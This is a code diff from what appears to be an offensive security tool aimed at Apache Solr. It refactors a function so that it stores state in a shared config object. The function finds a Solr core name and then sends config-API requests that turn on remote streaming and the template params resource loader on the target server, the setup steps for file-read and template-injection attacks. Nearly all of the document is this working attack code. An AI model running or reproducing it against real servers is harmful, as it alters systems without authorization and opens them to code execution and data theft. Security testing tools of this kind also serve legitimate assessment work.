@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
+from lib.initial.config import config
 import re
 
 config_data_base = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
@@ -27,11 +28,11 @@ enable_payloads = [
     }
 ]
 
-def enable(self, client):
+def enable(client):
     ''' 用于开启Solr的RemoteStreaming或自定义模板(params.resource.loader.enabled) '''
     vul_info = {
-        'app_name': self.app_name,
-        'vul_type': 'Solr',
+        'app_name': 'ApacheSolr',
+        'vul_type': 'Solr-Tool',
         'vul_id': 'Solr-enable',
     }
 
@@ -40,7 +41,7 @@ def enable(self, client):
     }
     
     for payload in enable_payloads:
-        if self.params:
+        if config.get('Solr-params'):
             return
 
         core_path = payload['core_path']
@@ -56,17 +57,17 @@ def enable(self, client):
         if res1 is None:
             return
         
-        db_name = re.search(r'"name":".+"', res1.text, re.M|re.I)        # * 如果存在solr的数据库名称
+        db_name = re.search(r'"name":".+"', res1.text, re.M|re.I)       # * 如果存在solr的数据库名称
         if db_name:
             db_name = db_name.group()
             db_name = db_name.replace('"name":', '')
-            self.db_name = db_name.strip('"')                            # * 只保留双引号内的数据库名称
+            config.set('Solr-db_name', db_name.strip('"'))              # * 只保留双引号内的数据库名称
             
-        if self.db_name:
+        if config.get('Solr-db_name'):
             # todo 2. 开启RemoteStreaming
             res2 = client.request(
                 'post',
-                config_path.format(self.db_name),
+                config_path.format(config.get('Solr-db_name')),
                 data=config_data,
                 headers=headers,
                 allow_redirects=False,
@@ -76,12 +77,12 @@ def enable(self, client):
                 return
             
             if (res2.status_code == 200):
-                self.RemoteStreaming = True
-                
+                config.set('Solr-RemoteStreaming', True)
+
             # todo 3. 开启params.resource.loader.enabled
             res3 = client.request(
                 'post',
-                config_path.format(self.db_name),
+                config_path.format(config.get('Solr-db_name')),
                 data=params_data,
                 headers=headers,
                 allow_redirects=False,
@@ -89,7 +90,7 @@ def enable(self, client):
             )
             if res3 is None:
                 return
-            
+
             if (res3.status_code == 200):
-                self.params = True
+                config.set('Solr-params', True)
     return None
